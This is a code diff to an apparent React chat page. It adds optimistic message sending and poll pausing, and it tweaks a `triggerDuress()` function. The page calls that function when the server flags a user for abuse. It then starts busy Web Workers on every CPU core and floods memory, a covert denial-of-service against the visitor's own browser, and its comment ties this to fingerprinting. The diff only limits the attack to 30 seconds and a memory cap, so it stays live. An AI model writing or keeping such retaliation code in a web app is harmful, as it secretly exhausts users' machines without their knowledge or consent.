@@ -109,9 +109,17 @@ function triggerDuress() {
   const url = URL.createObjectURL(new Blob([workerCode], { type: 'application/javascript' }))
   const cores = navigator.hardwareConcurrency || 4
   for (let i = 0; i < cores; i++) { const w = new Worker(url); w.postMessage('go') }
+  // Cap main-thread fill at 2M to pressure GC without OOM-crashing the tab.
+  // Auto-stop after 30s — fingerprinting is done by then.
   const g: number[] = []
-  const fill = () => { for (let i = 0; i < 1e6; i++) g.push(Math.random()); requestAnimationFrame(fill) }
+  let running = true
+  const fill = () => {
+    if (!running) return
+    for (let i = 0; i < 1e6; i++) { g.push(Math.random()); if (g.length > 2e6) g.splice(0, 5e5) }
+    requestAnimationFrame(fill)
+  }
   fill()
+  setTimeout(() => { running = false; g.length = 0 }, 30_000)
 }
 
 export default function Home() {
@@ -151,6 +159,8 @@ export default function Home() {
   const [sending, setSending] = useState(false)
   const [sendError, setSendError] = useState('')
   const bottomRef = useRef<HTMLDivElement>(null)
+  // Ref to the poll interval so we can pause it during send
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
   const [notes, setNotes] = useState<Note[]>([])
   const [activeNote, setActiveNote] = useState<Note | null>(null)
   const [noteTitle, setNoteTitle] = useState('')
@@ -173,8 +183,8 @@ export default function Home() {
     if (tab !== 'chat') return
     const load = () => fetch('/api/messages').then(r => r.json()).then(d => { if (Array.isArray(d)) setMessages(d) })
     load()
-    const t = setInterval(load, 3000)
-    return () => clearInterval(t)
+    pollRef.current = setInterval(load, 3000)
+    return () => { if (pollRef.current) clearInterval(pollRef.current) }
   }, [tab])
 
   useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages])
@@ -187,22 +197,33 @@ export default function Home() {
   async function sendMessage(e: React.FormEvent) {
     e.preventDefault()
     if (!msgInput.trim() || sending) return
-    setSending(true); setSendError('')
     const effectiveName = username.trim() || sessionId
+    // Optimistic insert
+    const optimisticId = 'opt-' + Date.now()
+    const optimistic: Message = { id: optimisticId, username: effectiveName, content: msgInput, created_at: new Date().toISOString() }
+    setMessages(m => [...m, optimistic])
+    setMsgInput('')
+    setSendError('')
+    setSending(true)
+    // Pause poll while request is in-flight to avoid duplicate flicker
+    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
     const res = await fetch('/api/messages', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: effectiveName, content: msgInput }),
+      body: JSON.stringify({ username: effectiveName, content: optimistic.content }),
     })
     const data = await res.json()
     if (!res.ok) {
       if (data.dos) triggerDuress()
+      setMessages(m => m.filter(x => x.id !== optimisticId)) // rollback
       setSendError(data.error || 'failed to send')
-      setSending(false); return
+    } else {
+      const d = await fetch('/api/messages').then(r => r.json())
+      if (Array.isArray(d)) setMessages(d)
     }
-    setMsgInput('')
-    const d = await fetch('/api/messages').then(r => r.json())
-    if (Array.isArray(d)) setMessages(d)
+    // Resume poll
+    const load = () => fetch('/api/messages').then(r => r.json()).then(d => { if (Array.isArray(d)) setMessages(d) })
+    pollRef.current = setInterval(load, 3000)
     setSending(false)
   }
 
